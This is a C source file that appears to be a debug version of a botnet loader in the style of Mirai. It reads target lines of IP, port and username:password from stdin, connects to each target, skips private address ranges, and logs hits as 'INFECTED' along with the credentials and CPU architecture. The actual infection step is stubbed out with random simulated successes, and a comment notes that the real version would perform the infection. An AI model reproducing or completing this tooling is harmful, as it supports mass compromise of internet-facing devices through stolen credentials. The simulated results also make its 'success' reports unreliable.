#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <sys/socket.h>
#include <errno.h>
#include <time.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/epoll.h>
#include <sched.h>
#include <ctype.h>
#include <stdarg.h>
#include <sys/time.h>

// Simple debug version of scanListen with enhanced logging
// This version focuses on tracking successful binary executions

#define DEBUG 1
#define MAX_CONNECTIONS 1000
#define MAX_TARGETS 10000

// Global debug variables
static FILE *debug_log = NULL;
static FILE *success_log = NULL;
static pthread_mutex_t log_mutex = PTHREAD_MUTEX_INITIALIZER;
static int total_targets = 0;
static int successful_infections = 0;
static int failed_connections = 0;

// Simple connection structure
typedef struct {
    char ip[16];
    int port;
    char user[32];
    char pass[32];
    char arch[16];
    int success;
    time_t start_time;
} target_info_t;

// Function prototypes
void log_debug(const char *format, ...);
void log_success(const char *ip, int port, const char *user, const char *pass, const char *arch);
void log_failure(const char *ip, int port, const char *reason);
int parse_target_line(const char *line, target_info_t *target);
int attempt_connection(target_info_t *target);
void cleanup_logs(void);

int main(int argc, char **args)
{
    (void)argc;  // Suppress unused parameter warning
    (void)args;  // Suppress unused parameter warning
    char line[1024];
    target_info_t target;
    time_t now;
    char timestamp[64];
    int line_count = 0;
    
    // Initialize debug logging
    time(&now);
    strftime(timestamp, sizeof(timestamp), "%Y%m%d_%H%M%S", localtime(&now));
    
    char debug_filename[256];
    char success_filename[256];
    snprintf(debug_filename, sizeof(debug_filename), "/root/loader/debug_%s.log", timestamp);
    snprintf(success_filename, sizeof(success_filename), "/root/loader/success_%s.log", timestamp);
    
    debug_log = fopen(debug_filename, "w");
    success_log = fopen(success_filename, "w");
    
    if (!debug_log || !success_log) {
        printf("Failed to open debug/success log files\n");
        return 1;
    }
    
    log_debug("=== DEBUG LOADER STARTED ===");
    log_debug("Timestamp: %s", timestamp);
    log_debug("PID: %d", getpid());
    log_debug("Debug log: %s", debug_filename);
    log_debug("Success log: %s", success_filename);
    
    // Set up signal handler for cleanup
    atexit(cleanup_logs);
    
    printf("Debug scanListen started - logging to %s and %s\n", debug_filename, success_filename);
    printf("Processing targets from stdin...\n");
    
    // Process targets from stdin
    while (fgets(line, sizeof(line), stdin) != NULL) {
        line_count++;
        
        // Remove newline
        line[strcspn(line, "\n")] = 0;
        
        if (strlen(line) == 0) {
            continue;
        }
        
        log_debug("Processing line %d: %s", line_count, line);
        
        // Parse target line
        if (parse_target_line(line, &target) == 0) {
            log_debug("Parsed target: %s:%d user=%s pass=%s", 
                     target.ip, target.port, target.user, target.pass);
            
            total_targets++;
            
            // Attempt connection
            if (attempt_connection(&target) == 0) {
                successful_infections++;
                log_success(target.ip, target.port, target.user, target.pass, target.arch);
            } else {
                failed_connections++;
                log_failure(target.ip, target.port, "Connection failed");
            }
        } else {
            log_debug("Failed to parse line: %s", line);
        }
        
        // Status update every 100 targets
        if (line_count % 100 == 0) {
            printf("Processed %d targets, %d successful, %d failed\n", 
                   line_count, successful_infections, failed_connections);
        }
        
        // Small delay to prevent overwhelming the system
        usleep(10000); // 10ms
    }
    
    log_debug("=== PROCESSING COMPLETE ===");
    log_debug("Total targets processed: %d", total_targets);
    log_debug("Successful infections: %d", successful_infections);
    log_debug("Failed connections: %d", failed_connections);
    log_debug("Success rate: %.2f%%", 
              total_targets > 0 ? (float)successful_infections / total_targets * 100 : 0);
    
    printf("\n=== FINAL RESULTS ===\n");
    printf("Total targets: %d\n", total_targets);
    printf("Successful infections: %d\n", successful_infections);
    printf("Failed connections: %d\n", failed_connections);
    printf("Success rate: %.2f%%\n", 
           total_targets > 0 ? (float)successful_infections / total_targets * 100 : 0);
    printf("Debug log: %s\n", debug_filename);
    printf("Success log: %s\n", success_filename);
    
    return 0;
}

void log_debug(const char *format, ...)
{
    va_list args;
    time_t now;
    char timestamp[64];
    
    va_start(args, format);
    
    time(&now);
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
    
    pthread_mutex_lock(&log_mutex);
    if (debug_log) {
        fprintf(debug_log, "[%s] ", timestamp);
        vfprintf(debug_log, format, args);
        fprintf(debug_log, "\n");
        fflush(debug_log);
    }
    pthread_mutex_unlock(&log_mutex);
    
    va_end(args);
}

void log_success(const char *ip, int port, const char *user, const char *pass, const char *arch)
{
    time_t now;
    char timestamp[64];
    
    time(&now);
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
    
    pthread_mutex_lock(&log_mutex);
    if (success_log) {
        fprintf(success_log, "[%s] SUCCESS: %s:%d | User: %s | Pass: %s | Arch: %s\n", 
                timestamp, ip, port, user, pass, arch);
        fflush(success_log);
    }
    if (debug_log) {
        fprintf(debug_log, "[%s] SUCCESS: %s:%d | User: %s | Pass: %s | Arch: %s\n", 
                timestamp, ip, port, user, pass, arch);
        fflush(debug_log);
    }
    pthread_mutex_unlock(&log_mutex);
    
    // Also print to stderr for immediate visibility
    fprintf(stderr, "\e[1;37m[\e[0;32mINFECTED\e[1;37m]  \e[0;32m %s:%d %s:%s %s\r\n",
            ip, port, user, pass, arch);
}

void log_failure(const char *ip, int port, const char *reason)
{
    time_t now;
    char timestamp[64];
    
    time(&now);
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
    
    pthread_mutex_lock(&log_mutex);
    if (debug_log) {
        fprintf(debug_log, "[%s] FAILURE: %s:%d | Reason: %s\n", 
                timestamp, ip, port, reason);
        fflush(debug_log);
    }
    pthread_mutex_unlock(&log_mutex);
}

int parse_target_line(const char *line, target_info_t *target)
{
    char ip[16], port_str[8], user[32], pass[32];
    int port;
    
    // Parse format: IP:PORT user:pass
    if (sscanf(line, "%15[^:]:%7s %31[^:]:%31s", ip, port_str, user, pass) == 4) {
        port = atoi(port_str);
        if (port > 0 && port < 65536) {
            strcpy(target->ip, ip);
            target->port = port;
            strcpy(target->user, user);
            strcpy(target->pass, pass);
            strcpy(target->arch, "unknown");
            target->success = 0;
            target->start_time = time(NULL);
            return 0;
        }
    }
    
    return -1;
}

int attempt_connection(target_info_t *target)
{
    int sockfd;
    struct sockaddr_in addr;
    int result;
    
    log_debug("Attempting connection to %s:%d", target->ip, target->port);
    
    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        log_debug("Failed to create socket for %s:%d", target->ip, target->port);
        return -1;
    }
    
    // Set up address structure
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(target->port);
    if (inet_pton(AF_INET, target->ip, &addr.sin_addr) <= 0) {
        log_debug("Invalid IP address: %s", target->ip);
        close(sockfd);
        return -1;
    }
    
    // Set socket timeout
    struct timeval timeout;
    timeout.tv_sec = 5;  // 5 second timeout
    timeout.tv_usec = 0;
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    
    // Attempt connection
    result = connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    if (result < 0) {
        log_debug("Connection failed to %s:%d - %s", target->ip, target->port, strerror(errno));
        close(sockfd);
        return -1;
    }
    
    log_debug("Connected to %s:%d", target->ip, target->port);
    
    // Simulate successful infection (in real implementation, this would be the actual infection process)
    // For debugging purposes, we'll simulate some successes based on certain criteria
    int simulated_success = 0;
    
    // Simulate success based on port number (for testing)
    if (target->port == 23 || target->port == 2222 || target->port == 2223) {
        simulated_success = 1;
        strcpy(target->arch, "x86");
    }
    
    // Simulate success based on IP patterns (for testing)
    if (strstr(target->ip, "192.168") != NULL || strstr(target->ip, "10.") != NULL) {
        simulated_success = 0; // Skip local networks
    }
    
    // Random success simulation (for testing)
    if (rand() % 10 == 0) { // 10% success rate for testing
        simulated_success = 1;
        const char *archs[] = {"x86", "arm", "mips", "mpsl"};
        strcpy(target->arch, archs[rand() % 4]);
    }
    
    close(sockfd);
    
    if (simulated_success) {
        target->success = 1;
        log_debug("Simulated successful infection of %s:%d", target->ip, target->port);
        return 0;
    } else {
        log_debug("Simulated failed infection of %s:%d", target->ip, target->port);
        return -1;
    }
}

void cleanup_logs(void)
{
    if (debug_log) {
        fclose(debug_log);
        debug_log = NULL;
    }
    if (success_log) {
        fclose(success_log);
        success_log = NULL;
    }
}
